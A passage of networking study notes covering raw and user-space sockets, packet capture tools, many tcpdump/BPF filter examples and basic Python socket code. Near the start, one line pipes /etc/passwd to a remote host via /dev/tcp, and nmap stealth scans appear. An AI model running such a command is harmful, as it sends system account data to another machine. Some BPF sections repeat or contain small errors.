            nc -lvp 1234

            Using /dev/tcp or /dev/udp to transmit data

            cat /etc/passwd > /dev/tcp/10.0.0.1/1234

    Kernel Space Sockets:

        Raw socket - A raw socket allows for the direct sending and receiving of IP packets without automatic protocol-specific transport layer formatting, meaning that all headers are typically included in the packet and not removed when moving up the network stack.

            Raw sockets tend to be specially crafted packets that do not follow normal communication methods.

            Any traffic that does not have a transport layer header (TCP/UDP) can be a RAW Socket.

                icmp - ping

                OSPF

                EIGRP

            Packets that have to be crafted with various flag combinations and other header field manipulation must be created as RAW Sockets. Tools like HPING and Nmap needs to open raw sockets when attempting to set specific flags for performing certain scans.

            nmap -sX 10.0.0.1
            nmap -sN 10.0.0.1
            nmap -sF 10.0.0.1

            Tcpdump requires raw sockets in order to receive each packet, in its entirety, for total packet analysis. The operating system normally strips all the headers when receiving data so to examine these packets with their headers intact they have to be captured as RAW Sockets.

            tcpdump -w capture.pcap

            Using Scapy to craft or modify a packet for transmission

            Using Python to craft or modify Raw Sockets for transmission

        Opening well ports in the Well-Known range (0-1023) require kernel access.

        python -m SimpleHTTPServer 80
        nc -lvp 123


## Popular Software Capture Programs


tcpdump (https://www.tcpdump.org/)

Wireshark (https://www.wireshark.org/)

tshark (https://www.wireshark.org/docs/man-pages/tshark.html)

p0f (https://github.com/p0f/p0f) - passive OS fingerprinting tool

NetworkMiner (https://www.netresec.com/?page=NetworkMiner)

NetMiner (http://www.netminer.com/product/overview.do)

SolarWinds Network Performance Monitor (https://www.solarwinds.com/network-performance-monitor)

BetterCap (https://www.bettercap.org/)

EtterCap (https://www.ettercap-project.org/)

Paessler PRTG Network Monitor (https://www.paessler.com/packet_capture)

ManageEngine NetFlow Analyzer (https://www.manageengine.com/products/netflow/)

Savvius Omnipeek (https://www.liveaction.com/products/omnipeek-network-protocol-analyzer/)

Telerik Fiddler (https://www.telerik.com/fiddler)

Colasoft Capsa (https://www.colasoft.com/capsa-free/)

Snort (https://www.snort.org/)



Kismet (https://www.kismetwireless.net/) - packet sniffer for 802.11 wireless LANs

L0phtCrack (https://www.l0phtcrack.com/) - password auditing and recovery application.

McAfee ePolicy Orchestrator (https://www.mcafee.com/enterprise/en-us/products/epolicy-orchestrator.html)

ngrep (https://github.com/jpr5/ngrep) - network capture tool similar to tcpdump

Nmap (https://nmap.org/) - has port scanning and OS fingerprinting features

Scapy (https://scapy.net/) - packet crafting tool built with python and can sniff packets

Snort (https://www.snort.org/) - IDS/IPS

Suricata (https://suricata-ids.org/) - IDS/IPS


## Interface Naming

Traditional

eth0, eth1

Consistent 

eno1, ens3



## Active Network Capturing

Primitive Values

Src-Dst

Host-Net

tcp-udp

## TCP Dump

-A prints payload in ASCII

-D list interfaces

-i = specify capture interface

-e print data-link headers

-X XX print payload in HEX and ASCII

-w write to pcap

-r read from pcap

-v vv or vvv verbosity

-n no inverse lookups


tcpdump -n "filter syntax" -r /home/activity_resources/pcaps/BPFCheck.pcap | wc -l


## Logical Operators 

Concatenation 'and' (&&)

Alteration 'or' (||)

Not 'not' (!)

< or <=

> or >=

= or ==


## TCP Dump Examples



    To print all ethernet traffic:

    tcpdump ether

    To print all packets related to ARP:

    tcpdump arp

    To print all packets related to ICMP:

    tcpdump icmp

    To print all ICMP echo-request packets :

    tcpdump 'icmp[icmptype] = icmp-echo'

    To print all ICMP echo-reply packets :

    tcpdump 'icmp[icmptype] = icmp-reply'

    To print all packets arriving at or departing from 192.168.1.1:

    tcpdump host 192.168.1.1

    To print all packets arriving at 192.168.1.1:

    tcpdump dst host 192.168.1.1

    To print all packets departing from 192.168.1.1:

    tcpdump src host 192.168.1.1

    To print all packets arriving at or departing from 192.168.1.0/24 network:

    tcpdump net 192.168.1.0/24

    To print all packets departing from 192.168.1.0/24 network:

    tcpdump src net 192.168.1.0/24

    To print all packets arriving at 192.168.1.0/24 network:

    tcpdump dst net 192.168.1.0/24

    To print all packets related to IPv4:

    tcpdump ip

    To print all packets related to IPv6:

    tcpdump ip6

    To print all packets related to TCP:

    tcpdump tcp

    To print all packets related to UDP:

    tcpdump udp

    To print all packets arriving at or departing from TCP port 22:

    tcpdump tcp port 22

    To print all packets arriving at TCP port 22:

    tcpdump tcp dst port 22

    To print all packets departing from TCP port 22:

    tcpdump tcp src port 22

    To print all packets arriving at or departing from TCP or UDP port 53:

    tcpdump port 53

    To print all packets with TCP flag ACK set:

    'tcp[tcpflags] = tcp-ack'




    To print traffic between 192.168.1.1 and either 10.1.1.1 or 10.1.1.2:

    tcpdump host 192.168.1.1 and \( 10.1.1.1 or 10.1.1.2 \)

    To print all IP packets between 10.1.1.1 and any host except 10.1.1.2:

    tcpdump ip host 10.1.1.1 and not 10.1.1.2

    To print all traffic between local hosts and hosts at Berkeley:

    tcpdump net ucb-ether

    To print all ftp traffic through internet gateway 192.168.1.1: (note that the expression is quoted to prevent the shell from (mis-)interpreting the parentheses):

    tcpdump 'gateway 192.168.1.1 and (port ftp or ftp-data)'

    To print traffic neither sourced from nor destined for local hosts (if you gateway to one other net, this stuff should never make it onto your local net).

    tcpdump ip and not net localnet

    To print the start and end packets (the SYN and FIN packets) of each TCP conversation that involves a non-local host.

    tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'

    To print the TCP packets with flags RST and ACK both set. (i.e. select only the RST and ACK flags in the flags field, and if the result is "RST and ACK both set", match)

    tcpdump 'tcp[tcpflags] & (tcp-rst|tcp-ack) == (tcp-rst|tcp-ack)'

    To print all IPv4 HTTP packets to and from port 80, i.e. print only packets that contain data, not, for example, SYN and FIN packets and ACK-only packets. (IPv6 is left as an exercise for the reader.)

    tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

    To print IP packets longer than 576 bytes sent through gateway 192.168.1.1:

    tcpdump 'gateway 192.168.1.1 and ip[2:2] > 576'

    To print IP broadcast or multicast packets that were not sent via Ethernet broadcast or multicast:

    tcpdump 'ether[0] & 1 = 0 and ip[16] >= 224'

    To print all ICMP packets that are not echo requests/replies (i.e., not ping packets):

    tcpdump 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply'




## BPFS Filters



    Primitive to find "arp":

    root@linux-opstation-pysn:~# tcpdump -d arp
    (000) ldh      [12]
    (001) jeq      #0x806           jt 2 jf 3
    (002) ret      #262144
    (003) ret      #0

    BPF to find "arp":

    root@linux-opstation-pysn:~# tcpdump -d ether[12:2]=0x0806
    (000) ldh      [12]
    (001) jeq      #0x806           jt 2 jf 3
    (002) ret      #262144
    (003) ret      #0


    Primitive to find "ip" and "icmp":

    root@linux-opstation-pysn:~# tcpdump -d ip and icmp
    (000) ldh      [12]
    (001) jeq      #0x800           jt 2 jf 5
    (002) ldb      [23]
    (003) jeq      #0x1              jt 4 jf 5
    (004) ret      #262144
    (005) ret      #0

ldh = load a half-word [12] = Starting at byte 12. Starting from the start of the frame (byte 0) you count up to byte 12. In this case its the Ether-type field

jeq #0x800 = jump if equal to 0x0800. E-type 0x0800 means that the next header is IPv4. jt 2 jf 5 = jump to line 2 if true or jump to line 5 if false

ldb = load a byte [23] = Starting at byte 23. Byte 0-13 is the Ethernet Frame. Since the next header is IPv4 it will start at byte 14. Counting the bytes, 23 is the Protocol field.

jeq #0x1 = jump if equal to 0x1. Protocol 0x01 saying that the next header is ICMPv4. jt 4 jf 5 = jump to line 4 if true or jump to line 5 if false

ret #262144 = just needs to be a large number to capture packet ret #0 = a null value means to ignore packet

    BPF to find "ip" and "icmp":

    root@linux-opstation-pysn:~# tcpdump -d 'ether[12:2]=0x0800 && ip[9]=0x01'
    (000) ldh      [12]
    (001) jeq      #0x800           jt 2 jf 6
    (002) jeq      #0x800           jt 3 jf 6
    (003) ldb      [23]
    (004) jeq      #0x1             jt 5 jf 6
    (005) ret      #262144
    (006) ret      #0

(001) jeq #0x800 jt 2 jf 6 = This is the result of searching for E-type 0x0800. (002) jeq #0x800 jt 3 jf 6 = This second line is automatically searched for when specifiying a "ip" header BPF.


    Primitive to find "ip6" and "icmp6":

    root@linux-opstation-pysn:~# tcpdump -d ip6 and icmp6
    (000) ldh [12]                 = Here is loading a half word starting at byte 12.
    (001) jeq      #0x86dd        jt 2 jf 8  = if its equal to 0x86dd then jump to line 2, else jump to line 8.
    (002) ldb      [20]             = Load 1 byte at byte 20
    (003) jeq      #0x3a          jt 7 jf 4  = Jump to line 7 if its 0x3a (58) which is the code for icmpv6. Goto line 4 if it is not.
    (004) jeq      #0x2c          jt 5 jf 8 = jump to line 5 if its 0x2c (44) which is IPv6-Fragmentation extension header. Goto line 8 if not.
    (005) ldb      [54]             = Load 1 byte at byte 54
    (006) jeq      #0x3a          jt 7 jf 8 = Jump to line 7 if its 0x3a (58) which is the code for icmpv6. Goto line 8 if it is not.
    (007) ret      #262144            = Has a number larger than the packet size so capture the packet.
    (008) ret      #0               = Has a null value so discard this packet.

    BPF to find "ip6" and "icmp6":

    root@linux-opstation-pysn:~# tcpdump -d 'ether[12:2]=0x86dd && (ip6[20]=0x3a || ip6[20]=0x2c)'                 =
    (000) ldh      [12]
    (001) jeq      #0x86dd          jt 2 jf 7 = like for 'ip' this line is because we are looking for E-type 0x86dd
    (002) jeq      #0x86dd          jt 3 jf 7 = this line is also looking for the same because we specified 'ip6' so it will automatically look for E-type 0x86dd
    (003) ldb      [34]
    (004) jeq      #0x3a            jt 6 jf 5
    (005) jeq      #0x2c            jt 6 jf 7
    (006) ret      #262144
    (007) ret      #0


    Primitive to find "tcp" and "src port 22":

    root@linux-opstation-pysn:~# tcpdump -d tcp src port 22
    (000) ldh      [12]               = Looks automatically for the E-type field
    (001) jeq      #0x86dd          jt 2 jf 6  = Looks for 0x86dd goto 2 if true or 6 if false
    (002) ldb      [20]               = Goto byte 20 in the ipv6 header
    (003) jeq      #0x6             jt 4 jf 15 = goto 4 if it equals 0x06 (TCP) else goto 15
    (004) ldh      [54]                = Load half-word at byte 54 (start of tcp header)
    (005) jeq      #0x16            jt 14 jf 15 = Jump to 14 if its 0x16 (22)
    (006) jeq      #0x800           jt 7 jf 15  = Secondly looks for 0x0800 if not 0x86dd from line 1. Goto 7 if true else 15.
    (007) ldb      [23]                = Goto byte 23 of ipv4 header
    (008) jeq      #0x6             jt 9 jf 15  = goto 9 if its 0x06 (TCP) else goto 15
    (009) ldh      [20]                = Load half-word at byte 20
    (010) jset     #0x1fff          jt 15 jf 11 = jset = jump if set. If the mask of 0x01fff had a value then goto 15. This is focusing on only the offset field. If there is a value here then its a fragment with no higher layer header encapsulated. Else goto 11
    (011) ldxb     4*([14]&0xf)           = this loads byte 14 with a mask of 0x0f which focuses on the IHL. Performs the math operation of (4 x (IHL value)). If IHL is 5 then value is 20. If IHL is 7 then value is 28. IHL of 15 is 60.
    (012) ldh      [x + 14]             = Load a half-word at X + 14. 14 is added to the value from line 11. 14 is the # of bytes from the Ethernet Header added to the size of the ip header.
    (013) jeq      #0x16            jt 14 jf 15 = jump to 14 if it equals 0x16 (22) else 15
    (014) ret      #262144              = Has a number larger than the packet size so capture the packet.
    (015) ret      #0                 = Has a null value so discard this packet.

    BPF to find "tcp" and "src port 22". The process is similar as using primitives except that it does not check for ipv6 and always assumes ipv4.:

    root@linux-opstation-pysn:~# tcpdump -d tcp[0:2]=22
    (000) ldh      [12]
    (001) jeq      #0x800           jt 2 jf 10
    (002) ldb      [23]
    (003) jeq      #0x6             jt 4 jf 10
    (004) ldh      [20]
    (005) jset     #0x1fff          jt 10 jf 6
    (006) ldxb     4*([14]&0xf)
    (007) ldh      [x + 14]
    (008) jeq      #0x16            jt 9 jf 10
    (009) ret      #262144
    (010) ret      #0


    Primitive to find "udp" and "dst port 53":

    root@linux-opstation-pysn:~# tcpdump -d udp dst port 53
    (000) ldh      [12]
    (001) jeq      #0x86dd          jt 2 jf 6
    (002) ldb      [20]
    (003) jeq      #0x11            jt 4 jf 15
    (004) ldh      [56]
    (005) jeq      #0x35            jt 14 jf 15
    (006) jeq      #0x800           jt 7 jf 15
    (007) ldb      [23]
    (008) jeq      #0x11            jt 9 jf 15
    (009) ldh      [20]
    (010) jset     #0x1fff          jt 15 jf 11
    (011) ldxb     4*([14]&0xf)
    (012) ldh      [x + 16]             = Adds 16 to the value of line 11. 14 bytes for Ethernet header and 2 bytes of the source port field.
    (013) jeq      #0x35            jt 14 jf 15
    (014) ret      #262144
    (015) ret      #0

    BPF to find "udp" and "dst port 53". Identical to using primitives except that it will not check for ipv6.:

    root@linux-opstation-pysn:~# tcpdump -d udp[2:2]=53
    (000) ldh      [12]
    (001) jeq      #0x800           jt 2 jf 10
    (002) ldb      [23]
    (003) jeq      #0x11            jt 4 jf 10
    (004) ldh      [20]
    (005) jset     #0x1fff          jt 10 jf 6
    (006) ldxb     4*([14]&0xf)
    (007) ldh      [x + 16]
    (008) jeq      #0x35            jt 9 jf 10
    (009) ret      #262144
    (010) ret      #0


    Primitive to find "tcp" and "port 80":

    root@linux-opstation-pysn:~# tcpdump -d tcp port 80
    (000) ldh      [12]
    (001) jeq      #0x86dd          jt 2 jf 8
    (002) ldb      [20]
    (003) jeq      #0x6             jt 4 jf 19
    (004) ldh      [54]
    (005) jeq      #0x50            jt 18 jf 6
    (006) ldh      [56]
    (007) jeq      #0x50            jt 18 jf 19
    (008) jeq      #0x800           jt 9 jf 19
    (009) ldb      [23]
    (010) jeq      #0x6             jt 11 jf 19
    (011) ldh      [20]
    (012) jset     #0x1fff          jt 19 jf 13
    (013) ldxb     4*([14]&0xf)
    (014) ldh      [x + 14]
    (015) jeq      #0x50            jt 18 jf 16
    (016) ldh      [x + 16]
    (017) jeq      #0x50            jt 18 jf 19
    (018) ret      #262144
    (019) ret      #0

    BPF to find "tcp" and "port 80". This would have to be done with 2 separate statements. Can only check for IPv4.:

    root@linux-opstation-pysn:~# tcpdump -d 'tcp[0:2]=80 || tcp[2:2]=80'
    (000) ldh      [12]
    (001) jeq      #0x800           jt 2 jf 12
    (002) ldb      [23]
    (003) jeq      #0x6             jt 4 jf 12
    (004) ldh      [20]
    (005) jset     #0x1fff          jt 12 jf 6
    (006) ldxb     4*([14]&0xf)
    (007) ldh      [x + 14]
    (008) jeq      #0x50            jt 11 jf 9
    (009) ldh      [x + 16]
    (010) jeq      #0x50            jt 11 jf 12
    (011) ret      #262144
    (012) ret      #0


    BPF to find DSCP:

    root@linux-opstation-pysn:~# tcpdump -d 'ip[1]&252=184'
    (000) ldh      [12]
    (001) jeq      #0x800           jt 2 jf 6
    (002) ldb      [15]                = looks at byte 15 which is the TOS field (or DSCP and ECN).
    (003) and      #0xfc               = Applies a mask of 0xfc (252) which only checks the high order 6 bits and ignores the low order 2 bits.
    (004) jeq      #0xb8            jt 5 jf 6  = Jump to 5 if it equals 0xb8 (184) else goto 6.
    (005) ret      #262144
    (006) ret      #0


    BPF to check the TCP flags for SYN+ACK. This must be an exact match.

    root@linux-opstation-pysn:~# tcpdump -d tcp[13]=17
    (001) jeq      #0x800           jt 2 jf 10
    (002) ldb      [23]
    (003) jeq      #0x6             jt 4 jf 10
    (004) ldh      [20]
    (005) jset     #0x1fff          jt 10 jf 6
    (006) ldxb     4*([14]&0xf)
    (007) ldb      [x + 27]               = Load a byte at 27 + value of line 5. This will take you to the TCP flags field
    (008) jeq      #0x11            jt 9 jf 10   = jump to 9 if it equals 0x11 (17) which is both the SYN and ACK flags turned on and rest of flags off.
    (009) ret      #262144
    (010) ret      #0

    This BPF will also check for SYN+ACK but other flags may/may not be set.

    root@linux-opstation-pysn:~# tcpdump -d 'tcp[13]&17=17'
    (000) ldh      [12]
    (001) jeq      #0x800           jt 2 jf 11
    (002) ldb      [23]
    (003) jeq      #0x6             jt 4 jf 11
    (004) ldh      [20]
    (005) jset     #0x1fff          jt 11 jf 6
    (006) ldxb     4*([14]&0xf)
    (007) ldb      [x + 27]                = Load a byte at 27 + value of line 5. This will take you to the TCP flags field
    (008) and      #0x11                 = Applies a mask to only check the SYN and ACK fields. Other bits are ignored.
    (009) jeq      #0x11            jt 10 jf 11   = jump to 10 if it equals 0x11 (17) which is both the SYN and ACK flags turned on and rest of flags are ignored.
    (010) ret      #262144
    (011) ret      #0

    BPF will just check the SYN+ACK bits to ensure that the combined value do not equal 0. Other flags are not matched.

    root@linux-opstation-pysn:~# tcpdump -d 'tcp[13]&17!=0'
    (000) ldh      [12]
    (001) jeq      #0x800           jt 2 jf 10
    (002) ldb      [23]
    (003) jeq      #0x6             jt 4 jf 10
    (004) ldh      [20]
    (005) jset     #0x1fff          jt 10 jf 6
    (006) ldxb     4*([14]&0xf)
    (007) ldb      [x + 27]
    (008) jset     #0x11            jt 9 jf 10   = Checks the SYN+ACK bits to see if they have a value. Other flags are ignored.
    (009) ret      #262144
    (010) ret      #0


    BPF that will check for VLAN tag and VLAN 111

    root@linux-opstation-pysn:~# tcpdump -d 'ether[12:2]=0x8100 && ether[14:2] & 0x0fff = 0x006f'
    (000) ldh      [12]                  = load a half word at byte 1
    (001) jeq      #0x8100          jt 2 jf 6     =  jump to 2 if it equals 0x8100 else jump to 6
    (002) ldh      [14]                  = load a half word at byte 14 which will be the PCP/DEI and VLAN ID field.
    (003) and      #0xfff                 = applies a mask of 0x0fff which will ignore the PCP/DEI field and only match on the VLAN ID field
    (004) jeq      #0x6f            jt 5 jf 6     = jump to 5 if it equals 0x006f (111). Notice that this is showing the leading zero's that normally are removed to identify that we are looking for the value of the entire 2 bytes. Else goto 6.
    (005) ret      #262144
    (006) ret      #0


## Berkly Packet Filters 

tcpdump {A} [B:C] {D} {E} {F} {G}

A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
B = Header Byte number
C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
D = optional: Bitwise mask (&)
E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
F = Result of Expression
G = optional: Logical Operator (&& ||) to bridge expressions



Example:
tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 && tcp[2:2] != 23)'

This expression with look for any IPv4 traffic that is not SSH or Telnet.

    First it will look at ether[12:2] which is typically the ethertype field. The expression tells the system to check if this field contains 0x0800.

    Conjoins the first expression with the &&.

    Using the () and || operators we can build two or more expressions to look for. In this case it checks the TCP destination field (tcp[2:2]) does not contain 22 or 23.


## DataLink BPFs

    Using BPFs to print source and destination MAC addresses. Since the maximum amount of bytes that can be read with BPF is 4 and the size of a MAC address is 6 bytes, we may have to prepare the filter in 2 or more parts conjoined.

        Here are 2 ways we can search for the destination broadcast MAC address.

        tcpdump -i eth0 'ether[0:4] = 0xffffffff and ether[4:2] = 0xffff'
        tcpdump -i eth0 'ether[0:2] = 0xffff and ether[2:2]= 0xffff and ether[4:2] = 0xffff'

        Here are 2 ways we can search for the source MAC address of fa:16:3e:f0:ca:fc.

        tcpdump -i eth0 'ether[6:4] = 0xfa163ef0 and ether[10:2] = 0xcafc'
        tcpdump -i eth0 'ether[6:2] = 0xfa16 and ether[8:2]= 0x3ef0 and ether[10:2] = 0xcafc'

    Search the first byte of the source (ether[0]) and destination (ether[6]) MAC to determine if it’s a unicast (0x00) or multicast (0x01) MAC address.

tcpdump -i eth0 'ether[0] & 0x01 = 0x00'
tcpdump -i eth0 'ether[0] & 0x01 = 0x01'
tcpdump -i eth0 'ether[6] & 0x01 = 0x00'
tcpdump -i eth0 'ether[6] & 0x01 = 0x01'

    Using BPFs to print packets interface with the EtherType (ether[12:2]) field matching IPv4, ARP, VLAN Tag, and IPv6 respectively.

tcpdump -i eth0 ether[12:2] = 0x0800
tcpdump -i eth0 ether[12:2] = 0x0806
tcpdump -i eth0 ether[12:2] = 0x8100
tcpdump -i eth0 ether[12:2] = 0x86dd

    Print packets that belong to VLAN 100. Here we are masking out the 4-bit PCP/DEI field. It is unsure if this field will or will not have a value so it’s best to ignore these bits unless you are looking for a specific value here.

tcpdump -i eth0 'ether[12:2] = 0x8100 and ether[14:2] & 0x0fff = 0x0064'
tcpdump -i eth0 'ether[12:4] & 0xffff0fff = 0x81000064'

    Print packets that have a double VLAN Tag.

tcpdump -i eth0 'ether[12:2] = 0x8100 and ether[16:2] = 0x8100'

    Print packets that are potential Double tagging (VLAN Hopping) using VLAN 1 (native) to attack VLAN 999

tcpdump -i eth0 'ether[12:4] & 0xffff0fff = 0x81000001 && ether[16:4] & 0xffff0fff = 0x810003E7

    Print all ARP requests and Reply’s respectively.

tcpdump -i eth0 arp[6:2] = 0x01
tcpdump -i eth0 arp[6:2] = 0x02



## Network Layer BPFs



    Print all ipv4 packets with the IHL greater than 5. This will indicate that there are IP options included after the IPv4 header but before the next encapsulated header.

tcpdump -i eth0 'ip[0] & 0x0f > 0x05'
tcpdump -i eth0 'ip[0] & 15 > 5'

    Print ipv4 packets with the DSCP value of 16.

tcpdump -i eth0 'ip[1] & 0xfc = 0x40'
tcpdump -i eth0 'ip[1] & 252 = 64'
tcpdump -i eth0 'ip[1] >> 2 = 16'

    Print ipv4 packets with various RES, DF or MF flags set.

        Print ipv4 packets with ONLY the RES flag set. DF and MF must be off.

        tcpdump -i eth0 'ip[6] & 0xE0 = 0x80'
        tcpdump -i eth0 'ip[6] & 224 = 128'

        Print ipv4 packets with ONLY the DF flag set. RES and MF must be off.

        tcpdump -i eth0 'ip[6] & 0xE0 = 0x40'
        tcpdump -i eth0 'ip[6] & 224 = 64'

        Print ipv4 packets with ONLY the MF flag set. RES and DF must be off.

        tcpdump -i eth0 'ip[6] & 0xE0 = 0x20'
        tcpdump -i eth0 'ip[6] & 224 = 32'

        Print ipv4 packets with any flag combination.

        tcpdump -i eth0 'ip[6] & 0xE0 > 0'
        tcpdump -i eth0 'ip[6] & 224 != 0'

        Print ipv4 packets with the RES bit set. The other 2 flags are ignored so they can be on or off.

        tcpdump -i eth0 'ip[6] & 0x80 = 0x80'
        tcpdump -i eth0 'ip[6] & 128 = 128'

        Print ipv4 packets with the DF bit set. The other 2 flags are ignored so they can be on or off.

        tcpdump -i eth0 'ip[6] & 0x40 = 0x40'
        tcpdump -i eth0 'ip[6] & 64 = 64'

        Print ipv4 packets with the MF bit set. The other 2 flags are ignored so they can be on or off.

        tcpdump -i eth0 'ip[6] & 0x20 = 0x20'
        tcpdump -i eth0 'ip[6] & 32 = 32'

    Print ipv4 packets with the offset field having any value greater than zero (0).

tcpdump -i eth0 'ip[6:2] & 0x1fff > 0'
tcpdump -i eth0 'ip[6:2] & 8191 > 0'

    Print ipv4 packets with the TTL being equal to and less than 128.

tcpdump -i eth0 'ip[8] = 128'
tcpdump -i eth0 'ip[8] < 128'

    Print any ICMPv4, TCP, or UDP encapsulated within an ipv4 packet.

tcpdump -i eth0 'ip[9] = 0x01'
tcpdump -i eth0 'ip[9] = 0x06'
tcpdump -i eth0 'ip[9] = 0x11'

    Print ipv4 packets with the source and destination address of 10.1.1.1.

tcpdump -i eth0 'ip[12:4] = 0x0a010101'
tcpdump -i eth0 'ip[16:4] = 0x0a010101'

    Print ipv6 packets with the Traffic Class of any value.

tcpdump -i eth0 'ip6[0:2] & 0x0ff0 != 0'

    Print ipv6 packets with the Flow Label field of any value.

tcpdump -i eth0 'ip6[0:4] & 0x000FFFFF != 0'

    Print any ICMPv6, TCP, or UDP encapsulated within an ipv6 packet.

tcpdump -i eth0 'ip6[6] = 0x3a'
tcpdump -i eth0 'ip6[6] = 0x06'
tcpdump -i eth0 'ip6[6] = 0x11'

    Print ipv6 packets with the TTL being equal to and less than 128.

tcpdump -i eth0 'ip6[7] = 128'
tcpdump -i eth0 'ip6[7] < 128'

    Print ICMPv4 packets set to Destination Unreachable (Type 3) and Network Administratively Prohibited (Code 9). Note: ICMPv6 is not supported by BPFs.

tcpdump -i eth0 'icmp[0] = 3 and icmp[1] = 9'



    Print all ipv4 packets with the IHL greater than 5. This will indicate that there are IP options included after the IPv4 header but before the next encapsulated header.

tcpdump -i eth0 'ip[0] & 0x0f > 0x05'
tcpdump -i eth0 'ip[0] & 15 > 5'

    Print ipv4 packets with the DSCP value of 16.

tcpdump -i eth0 'ip[1] & 0xfc = 0x40'
tcpdump -i eth0 'ip[1] & 252 = 64'
tcpdump -i eth0 'ip[1] >> 2 = 16'

    Print ipv4 packets with various RES, DF or MF flags set.

        Print ipv4 packets with ONLY the RES flag set. DF and MF must be off.

        tcpdump -i eth0 'ip[6] & 0xE0 = 0x80'
        tcpdump -i eth0 'ip[6] & 224 = 128'

        Print ipv4 packets with ONLY the DF flag set. RES and MF must be off.

        tcpdump -i eth0 'ip[6] & 0xE0 = 0x40'
        tcpdump -i eth0 'ip[6] & 224 = 64'

        Print ipv4 packets with ONLY the MF flag set. RES and DF must be off.

        tcpdump -i eth0 'ip[6] & 0xE0 = 0x20'
        tcpdump -i eth0 'ip[6] & 224 = 32'

        Print ipv4 packets with any flag combination.

        tcpdump -i eth0 'ip[6] & 0xE0 > 0'
        tcpdump -i eth0 'ip[6] & 224 != 0'

        Print ipv4 packets with the RES bit set. The other 2 flags are ignored so they can be on or off.

        tcpdump -i eth0 'ip[6] & 0x80 = 0x80'
        tcpdump -i eth0 'ip[6] & 128 = 128'

        Print ipv4 packets with the DF bit set. The other 2 flags are ignored so they can be on or off.

        tcpdump -i eth0 'ip[6] & 0x40 = 0x40'
        tcpdump -i eth0 'ip[6] & 64 = 64'

        Print ipv4 packets with the MF bit set. The other 2 flags are ignored so they can be on or off.

        tcpdump -i eth0 'ip[6] & 0x20 = 0x20'
        tcpdump -i eth0 'ip[6] & 32 = 32'

    Print ipv4 packets with the offset field having any value greater than zero (0).

tcpdump -i eth0 'ip[6:2] & 0x1fff > 0'
tcpdump -i eth0 'ip[6:2] & 8191 > 0'

    Print ipv4 packets with the TTL being equal to and less than 128.

tcpdump -i eth0 'ip[8] = 128'
tcpdump -i eth0 'ip[8] < 128'

    Print any ICMPv4, TCP, or UDP encapsulated within an ipv4 packet.

tcpdump -i eth0 'ip[9] = 0x01'
tcpdump -i eth0 'ip[9] = 0x06'
tcpdump -i eth0 'ip[9] = 0x11'

    Print ipv4 packets with the source and destination address of 10.1.1.1.

tcpdump -i eth0 'ip[12:4] = 0x0a010101'
tcpdump -i eth0 'ip[16:4] = 0x0a010101'

    Print ipv6 packets with the Traffic Class of any value.

tcpdump -i eth0 'ip6[0:2] & 0x0ff0 != 0'

    Print ipv6 packets with the Flow Label field of any value.

tcpdump -i eth0 'ip6[0:4] & 0x000FFFFF != 0'

    Print any ICMPv6, TCP, or UDP encapsulated within an ipv6 packet.

tcpdump -i eth0 'ip6[6] = 0x3a'
tcpdump -i eth0 'ip6[6] = 0x06'
tcpdump -i eth0 'ip6[6] = 0x11'

    Print ipv6 packets with the TTL being equal to and less than 128.

tcpdump -i eth0 'ip6[7] = 128'
tcpdump -i eth0 'ip6[7] < 128'

    Print ICMPv4 packets set to Destination Unreachable (Type 3) and Network Administratively Prohibited (Code 9). Note: ICMPv6 is not supported by BPFs.

tcpdump -i eth0 'icmp[0] = 3 and icmp[1] = 9'

https://miro.com/app/board/o9J_klSqCSY=/?moveToWidget=3074457350284827156&cot=14


tcp[13] % 0x01 = 1


# Socket Programming
## String Socket TCP
User Space - most common sockets

## Datagram Socket UDP
User Space - most common sockets

## Raw Socket (Whatever)
Kernel Space and require SUDO

## User Space Applications/Sockets

    Using tcpdump or wireshark to read a file

    Using nmap with no switches

    Using netcat to connect to a listener

    Using netcat to create a listener above the well known port range (1024+)

    Using /dev/tcp or /dev/udp to transmit data

## Kernel Space Applications/Sockets

    Using tcpdump or wireshark to capture packets on the wire

    Using nmap for OS identification or to set specific flags when scanning

    Using netcat to create a listener in the well known port range (0 - 1023)
    
    Using Scapy to craft or modify a packet for transmission

    Using Python to craft or modify RAW Sockets for transmission

    Network devices using routing protocols such as OSPF

    Any Traffic without Transport Header (ICMP)

## Understanding Python Terminology

Libraries (Standard Python Library)

Modules:

Functions (modules.functions)

Exceptions (try:)

Constants (AF_INET)

Objects ()

List [] or Tuples ()


## Strings, Integers

    String

        my_string = "Hello World"

    Number

        int = 1234

        float = 3.14

        hex = 0x45
   
    int()

    len()

    str()

    sum()


## Methods

    my_string.upper()

    my_string.lower()

    my_string.split()

    my_list.append()

    my_list.insert()
    print()


## Import Modules

    import {module}

    import {module} as {name}

    from {module} import *

    from {module} import {function}

    from {module} import {function} as {name}**

## Networking Programming with PYTHON3

![image](https://github.com/user-attachments/assets/5160dcf8-9d9f-4365-ad19-d0884fa23730)

Network sockets primarily use the Python3 Socket library and socket.socket function.

```
import socket
  s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)
```

## Socket.Socket Function

Inside the socket.socket. function, you have these arguments, in order:
```
socket.socket( *family*, *type*, *proto* )

    family: AF_INET*, AF_INET6, AF_UNIX

    type: SOCK_STREAM*, SOCK_DGRAM, SOCK_RAW

    proto: 0*, IPPROTO_TCP, IPPROTO_UDP, IPPROTO_IP, IPPROTO_ICMP, IPPROTO_RAW

Default is IPv4 Stream Socket


```

## Python Libraries

Socket

Struct

Sys

Errors

Exceptions


## Stream Socket S/R DEMO


vim script.py

chmod +x script.py

nc -lvp 1111

./script.py



**SENDER**
```
#!/usr/bin/python3
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
ip_addr = '127.0.0.1'    
port = 1111
s.connect((ip_addr, port))
message = b"Message"
s.send(message)
data, conn = s.recvfrom(1024)
print(data.decode('utf-8'))
s.close()

```
**ip_addr = '127.0.0.1'**

**port = 1111**

**message = b"Message"**

**RECEIVER**
```
#!/usr/bin/python3
import socket
import os
port = 1111
message = b"Connected to TCP Server on port %i\n" % port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('', port))
